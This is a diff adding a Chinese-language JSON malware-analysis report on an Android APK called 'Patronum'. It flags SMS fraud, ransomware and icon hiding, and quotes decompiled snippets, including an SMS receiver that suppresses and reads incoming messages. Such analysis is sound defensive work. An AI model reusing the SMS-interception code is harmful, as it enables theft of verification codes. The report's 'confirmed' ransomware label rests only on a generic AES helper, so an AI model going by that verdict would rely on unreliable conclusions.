@@ -1,0 +1,139 @@
+{
+  "APK信息": {
+    "文件名": "9a15f25543a99ead13ac5ee1d3a87c8a702aaf1ff31251af7156be784cff430c.apk",
+    "sha256": "9a15f25543a99ead13ac5ee1d3a87c8a702aaf1ff31251af7156be784cff430c",
+    "包名": "com.patronum.android",
+    "应用名": "Patronum",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 732.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\patronum\\android\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n        abortBroadcast();\n        Bundle extras = intent.getExtras();\n        if (extras != null) {\n            Object[] objArr = (Object[]) extras.get(\"pdus\");\n            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n            for (int i = 0; i < objArr.length; i++) {\n                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n            }\n            for (SmsMessage smsMessage : smsMessageArr) {\n                smsMessage.getDisplayOriginatingAddress();\n            }\n        }\n    }\n}",
+          "malicious_code_snippet_context": "      final SimpleDateFormat a = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.a.format(new Date(smsMessage.getTimestampMillis()));\n>>>                 }\n              }\n          }\n      }",
+          "behavior_description": "该 BroadcastReceiver 监听短信接收广播 SMS_RECEIVED，收到短信后立即调用 abortBroadcast() 中止广播传递，阻止短信到达系统短信应用，同时从 intent 的 extras 中提取 pdus 数据并解析为 SmsMessage 对象，获取发送方地址和短信内容。数据流向：SMS_RECEIVED Intent (source) → abortBroadcast() 中止广播 + 解析短信PDU获取内容 (sink)，实现短信拦截功能，可被用于拦截验证码、银行通知等关键短信，造成用户损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\gms\\common\\util\\AES;",
+          "method_signature": "encrypt(byte[] bArr, byte[] bArr2, byte[] bArr3)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\ncipher.init(1, new SecretKeySpec(bArr2, \"AES\"), new IvParameterSpec(bArr3));\nbyte[] doFinal = cipher.doFinal(bArr);",
+          "malicious_code_snippet_context": "  \n      public static byte[] encrypt(byte[] bArr, byte[] bArr2, byte[] bArr3) {\n          try {\n>>>             Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>             cipher.init(1, new SecretKeySpec(bArr2, \"AES\"), new IvParameterSpec(bArr3));\n>>>             byte[] doFinal = cipher.doFinal(bArr);\n              ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(doFinal.length);\n              byteArrayOutputStream.write(doFinal);\n              return byteArrayOutputStream.toByteArray();",
+          "behavior_description": "伪装在Google Play Services包名下的自定义AES加密类，使用AES/CBC/PKCS5Padding模式对传入数据进行加密。在已确认的勒索软件上下文中，该类作为核心加密组件，用于加密用户文件数据以实施勒索。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting",
+          "hideIcon"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lmobi\\flame\\browserlibrary\\config\\jsonbean\\AppConfigBean;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "@SerializedName(\"hide_icon\")\npublic boolean hideIcon = false;",
+          "malicious_code_snippet_context": "      @SerializedName(\"guid_facebook\")\n      public String guidFacebook = \"https://www.facebook.com/suposec/\";\n  \n>>>     @SerializedName(\"hide_icon\")\n>>>     public boolean hideIcon = false;\n  \n      @SerializedName(\"is_old_main\")\n      public boolean is_old_main = false;",
+          "behavior_description": "该代码定义了一个远程配置字段 hideIcon，用于控制是否隐藏应用图标。作为 AppConfigBean 的一部分，该字段通过 Gson 序列化从远程服务器下发的 JSON 配置中解析获取。当服务端将 hideIcon 设置为 true 时，恶意应用可在运行时读取该配置并调用 PackageManager.setComponentEnabledSetting() 等方式隐藏自身图标，使用户难以发现和卸载，从而实现持久化驻留和隐蔽运行。数据流向：远程C2服务器JSON配置(source) → 解析hideIcon字段 → 触发图标隐藏操作(sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
